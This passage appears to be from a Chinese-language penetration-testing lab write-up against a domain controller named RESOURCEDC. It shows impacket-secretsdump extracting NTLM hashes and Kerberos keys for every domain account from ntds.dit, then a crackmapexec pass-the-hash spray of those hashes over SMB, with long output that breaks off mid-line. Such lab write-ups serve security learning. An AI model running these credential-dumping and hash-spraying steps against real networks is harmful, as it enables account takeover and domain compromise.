<p><code>-ntds ntds.dit</code>：文件本身包含用户的账户信息以及密码哈希。</p>
<p><code>-system SYSTEM</code>：包含System注册表信息的文件（通常为 <code>SYSTEM</code>）。</p>
<p><code>-security SECURITY</code>：包含Security注册表信息的文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds ./ntds.dit -system ./Security local -system ./system</span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Target system bootKey<span class="punctuation">:</span> <span class="number">0x6f961da31c7ffaf16683f78e04c3e03d</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Dumping Domain Credentials (domain\uid<span class="punctuation">:</span>rid<span class="punctuation">:</span>lmhash<span class="punctuation">:</span>nthash)</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Searching for pekList<span class="punctuation">,</span> be patient</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> PEK # <span class="number">0</span> found and decrypted<span class="punctuation">:</span> <span class="number">9298735</span>ba0d788c4fc05528650553f94</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Reading and decrypting hashes from ./ntds.dit</span><br><span class="line">Administrator<span class="punctuation">:</span><span class="number">500</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">Guest<span class="punctuation">:</span><span class="number">501</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">RESOURCEDC$<span class="punctuation">:</span><span class="number">1000</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">krbtgt<span class="punctuation">:</span><span class="number">502</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">M.Mason<span class="punctuation">:</span><span class="number">1103</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">K.Keen<span class="punctuation">:</span><span class="number">1104</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">L.Livingstone<span class="punctuation">:</span><span class="number">1105</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">J.Johnson<span class="punctuation">:</span><span class="number">1106</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">V.Ventz<span class="punctuation">:</span><span class="number">1107</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">S.Swanson<span class="punctuation">:</span><span class="number">1108</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">P.Parker<span class="punctuation">:</span><span class="number">1109</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">R.Robinson<span class="punctuation">:</span><span class="number">1110</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">D.Durant<span class="punctuation">:</span><span class="number">1111</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">G.Goldberg<span class="punctuation">:</span><span class="number">1112</span><span class="punctuation">:</span>aad3b435b51404eeaad3b435b51404ee<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2<span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Kerberos keys from ./ntds.dit</span><br><span class="line">Administrator<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">73410</span>f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8</span><br><span class="line">Administrator<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>b4fc11e40a842fff6825e93952630ba2</span><br><span class="line">Administrator<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">80861</span>f1a80f1232f</span><br><span class="line">RESOURCEDC$<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4</span><br><span class="line">RESOURCEDC$<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">27</span>ea2c704e75c6d786cf7e8ca90e0a6a</span><br><span class="line">RESOURCEDC$<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span>ab089e317a161cc1</span><br><span class="line">krbtgt<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">12</span>b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5</span><br><span class="line">krbtgt<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">3165</span>b2a56efb5730cfd34f2df472631a</span><br><span class="line">krbtgt<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span>f1b602194f3713f8</span><br><span class="line">M.Mason<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">21e5</span>d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04</span><br><span class="line">M.Mason<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">99</span>d5ca7207ce4c406c811194890785b9</span><br><span class="line">M.Mason<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">268501</span>b50e0bf47c</span><br><span class="line">K.Keen<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">9</span>a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f</span><br><span class="line">K.Keen<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>e767891c7f02fdf7c1d938b7835b0115</span><br><span class="line">K.Keen<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">572</span>cce13b38ce6da</span><br><span class="line">L.Livingstone<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f</span><br><span class="line">L.Livingstone<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">1</span>dec73e935e57e4f431ac9010d7ce6f6</span><br><span class="line">L.Livingstone<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span>bf01fb23d0e6d0ab</span><br><span class="line">J.Johnson<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">0452</span>f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6</span><br><span class="line">J.Johnson<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>c438ef912271dbbfc83ea65d6f5fb087</span><br><span class="line">J.Johnson<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span>ea01d3d69d7c57f4</span><br><span class="line">V.Ventz<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">4951</span>bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c</span><br><span class="line">V.Ventz<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>ea815fe7c1112385423668bb17d3f51d</span><br><span class="line">V.Ventz<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">4</span>af77a3d1cf7c480</span><br><span class="line">S.Swanson<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">8</span>a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085</span><br><span class="line">S.Swanson<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">6</span>c5699aaa888eb4ec2bf1f4b1d25ec4a</span><br><span class="line">S.Swanson<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">5</span>d37583eae1f2f34</span><br><span class="line">P.Parker<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb</span><br><span class="line">P.Parker<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>e71c552013df33c9e42deb6e375f6230</span><br><span class="line">P.Parker<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">083</span>b37079dcd764f</span><br><span class="line">R.Robinson<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">90</span>ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b</span><br><span class="line">R.Robinson<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">2210</span>ad6b5ae14ce898cebd7f004d0bef</span><br><span class="line">R.Robinson<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">7051</span>d568dfd0852f</span><br><span class="line">D.Durant<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span>a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a</span><br><span class="line">D.Durant<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">8</span>a2b701764d6fdab7ca599cb455baea3</span><br><span class="line">D.Durant<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">376119</span>bfcea815f8</span><br><span class="line">G.Goldberg<span class="punctuation">:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">0</span>d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91</span><br><span class="line">G.Goldberg<span class="punctuation">:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="punctuation">:</span><span class="number">00</span>f4d3e907818ce4ebe3e790d3e59bf7</span><br><span class="line">G.Goldberg<span class="punctuation">:</span>des-cbc-md5<span class="punctuation">:</span><span class="number">3e20</span>fd1a25687673</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Cleaning up...</span><br></pre></td></tr></table></figure>

<p>尝试使用hashcat 和john破解hash, 没有结果</p>
<p>创建user.txt 和hash文件，利用crackmapexec 查找利用密码</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-26.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">crackmapexec smb <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -u user.txt -H ntlm_no_user.hash --continue-on-success</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Administrator<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\Guest<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">980910</span>b8fc2e4fe9d482123301dd19fe STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span>fea5a148c14cf51590456b2102b29fac STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">08</span>aca8ed17a9eec9fac4acdcb4652c35 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\RESOURCEDC$<span class="punctuation">:</span><span class="number">62e16</span>d17c3015c47b4d513e65ca757a2 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">12579</span>b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">9</span>ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">3004</span>b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">3105e0</span>f6af52aba8e11d19f27e487e45 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">204410</span>cc5a7147cd52a04ddae6754b0c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">3e028552</span>b946cc4f282b72879f63b726 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span><span class="number">913</span>c144caea1c0a936fd1ccb46929d3c STATUS_LOGON_FAILURE</span><br><span class="line">SMB         <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> <span class="number">445</span>    RESOURCEDC       <span class="punctuation">[</span>-<span class="punctuation">]</span> resourced.local\krbtgt<span class="punctuation">:</span>bd7c11a9021d2708eda561984f3c8939 STATUS_LOGON_FAILURE</span><br><span 